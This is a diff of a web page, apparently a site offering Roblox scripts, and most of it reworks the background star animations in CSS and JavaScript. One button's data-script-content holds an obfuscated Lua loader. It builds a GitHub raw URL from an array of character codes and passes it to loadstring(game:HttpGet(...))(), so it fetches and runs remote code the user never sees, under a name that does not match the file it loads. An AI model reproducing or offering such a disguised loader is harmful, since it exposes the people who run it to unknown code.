@@ -40,6 +40,8 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            position: relative;
+            z-index: 1;
         }
 
         header {
@@ -91,59 +93,22 @@
 
         .star {
             position: absolute;
-            background: white;
+            background: rgba(255,255,255,0.9);
             border-radius: 50%;
             filter: blur(0.5px);
-            animation: twinkle 5s infinite alternate;
+            box-shadow: 0 0 5px 1px rgba(255,255,255,0.7);
+            animation: 
+                twinkle 3s infinite ease-in-out alternate,
+                drift linear infinite;
         }
 
-        .shooting-star {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: linear-gradient(90deg, rgba(255,255,255,0), rgba(255,255,255,0.8));
-            border-radius: 50%;
-            filter: blur(1px);
-        }
-
-        .shooting-star::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 100%;
-            width: 150px;
-            height: 1px;
-            background: linear-gradient(90deg, rgba(255,255,255,0.8), rgba(255,255,255,0));
-            transform: translateY(-50%);
-        }
-
-        .comet {
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 70%);
-            border-radius: 50%;
-            filter: blur(0.5px);
-        }
-
-        .comet::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 100%;
-            width: 200px;
-            height: 2px;
-            background: linear-gradient(90deg, 
-                rgba(255,255,255,0.8) 0%, 
-                rgba(200,200,255,0.6) 20%,
-                rgba(150,150,255,0.4) 40%,
-                rgba(100,100,255,0.2) 60%,
-                rgba(50,50,255,0) 100%);
-            transform: translateY(-50%);
+        @keyframes drift {
+            0% { transform: translateX(100vw) translateY(0); }
+            100% { transform: translateX(-20vw) translateY(20vh); }
         }
 
         @keyframes twinkle {
-            0%, 100% { opacity: 0.2; }
+            0%, 100% { opacity: 0.5; }
             50% { opacity: 1; }
         }
 
@@ -227,6 +192,7 @@
             opacity: 0;
             transform: translateY(20px);
             box-shadow: 0 0 0 1px rgba(255,255,255,0.1);
+            animation: fadeInUp 0.6s ease-out 0.7s forwards;
         }
 
         .script-btn span {
@@ -275,8 +241,6 @@
         .script-btn:active {
             transform: translateY(0);
         }
-
-        .script-btn:nth-child(1) { animation: fadeInUp 0.6s ease-out 0.7s forwards; }
 
         .info-text {
             color: #aaa;
@@ -451,7 +415,7 @@
     <div class="container">
         <header>
             <h1 class="logo">Flash's Scripts</h1>
-            <p class="subtitle">Simple Roblox scripts</p>
+            <p class="subtitle">Simple Roblox utilities for fun gameplay</p>
         </header>
 
         <!-- AI Search Box -->
@@ -461,7 +425,7 @@
         </div>
 
         <div class="button-grid">
-            <!-- Only one button now -->
+            <!-- Only one button now with synchronized RGB effect -->
             <button class="script-btn" data-script-name="AnvilVoider" data-script-content='local a=game local b=a.HttpGet local c=function(d)return string.char(d)end local e={104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,117,122,105,107,105,108,108,97,122,47,115,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,70,108,97,115,104,80,114,111,116,101,99,116,46,116,120,116} local f="" for _,g in pairs(e) do f=f..c(g) end loadstring(b(a,f))()'>
                 <span>AnvilVoider</span>
             </button>
@@ -489,112 +453,35 @@
             }
         ];
 
-        // Enhanced Cosmic Background
+        // Enhanced Cosmic Background with visible stars
         function createCosmicBackground() {
             const cosmicBg = document.getElementById('cosmicBg');
+            cosmicBg.innerHTML = ''; // Clear existing stars
             
-            // Create stars
+            // Create stars with uniform movement
             for (let i = 0; i < 150; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
                 
-                // Random position
-                star.style.left = `${Math.random() * 100}vw`;
+                // Random position (starting from right side)
+                star.style.left = `${Math.random() * 120}vw`;
                 star.style.top = `${Math.random() * 100}vh`;
                 
                 // Random size
-                const size = Math.random() * 3 + 0.5;
+                const size = Math.random() * 2 + 0.5;
                 star.style.width = `${size}px`;
                 star.style.height = `${size}px`;
                 
                 // Random opacity
-                star.style.opacity = Math.random() * 0.8 + 0.2;
+                star.style.opacity = Math.random() * 0.7 + 0.3;
                 
-                // Random twinkle effect
-                star.style.animation = `twinkle ${Math.random() * 5 + 3}s infinite ${Math.random() * 5}s alternate`;
+                // Uniform speed with slight variation
+                const duration = 40 + Math.random() * 30; // 40-70 seconds
+                star.style.animationDuration = `${3}s, ${duration}s`;
+                star.style.animationDelay = `${Math.random() * 5}s, 0s`;
                 
                 cosmicBg.appendChild(star);
             }
-            
-            // Create shooting stars
-            function createShootingStar() {
-                const shootingStar = document.createElement('div');
-                shootingStar.className = 'shooting-star';
-                
-                // Start position (right side of screen)
-                const startY = Math.random() * 100;
-                shootingStar.style.left = '100vw';
-                shootingStar.style.top = `${startY}vh`;
-                
-                // Random size
-                const size = Math.random() * 3 + 2;
-                shootingStar.style.width = `${size}px`;
-                shootingStar.style.height = `${size}px`;
-                
-                // Random speed
-                const duration = Math.random() * 1.5 + 0.5;
-                
-                // Add to DOM
-                cosmicBg.appendChild(shootingStar);
-                
-                // Animate
-                shootingStar.style.transition = `all ${duration}s linear`;
-                setTimeout(() => {
-                    shootingStar.style.left = `${-150}px`;
-                    shootingStar.style.top = `${startY + Math.random() * 20 - 10}vh`;
-                }, 10);
-                
-                // Remove after animation
-                setTimeout(() => {
-                    shootingStar.remove();
-                }, duration * 1000);
-            }
-            
-            // Create comets
-            function createComet() {
-                const comet = document.createElement('div');
-                comet.className = 'comet';
-                
-                // Start position (random edge)
-                const startX = Math.random() > 0.5 ? 100 : Math.random() * 100;
-                const startY = Math.random() > 0.5 ? 100 : Math.random() * 100;
-                comet.style.left = `${startX}vw`;
-                comet.style.top = `${startY}vh`;
-                
-                // Random size
-                const size = Math.random() * 4 + 3;
-                comet.style.width = `${size}px`;
-                comet.style.height = `${size}px`;
-                
-                // Random speed
-                const duration = Math.random() * 8 + 4;
-                
-                // Add to DOM
-                cosmicBg.appendChild(comet);
-                
-                // Animate
-                comet.style.transition = `all ${duration}s linear`;
-                setTimeout(() => {
-                    comet.style.left = `${startX - (Math.random() * 50 + 50)}vw`;
-                    comet.style.top = `${startY + (Math.random() * 40 - 20)}vh`;
-                    comet.style.opacity = '0';
-                }, 10);
-                
-                // Remove after animation
-                setTimeout(() => {
-                    comet.remove();
-                }, duration * 1000);
-            }
-            
-            // Create initial shooting stars and comets
-            for (let i = 0; i < 5; i++) {
-                setTimeout(createShootingStar, Math.random() * 3000);
-                setTimeout(createComet, Math.random() * 5000);
-            }
-            
-            // Continuous creation
-            setInterval(createShootingStar, 2000);
-            setInterval(createComet, 4000);
         }
 
         // Notification system
@@ -727,8 +614,6 @@
             
             // Adjust on resize
             window.addEventListener('resize', () => {
-                const cosmicBg = document.getElementById('cosmicBg');
-                cosmicBg.innerHTML = '';
                 createCosmicBackground();
             });
         });
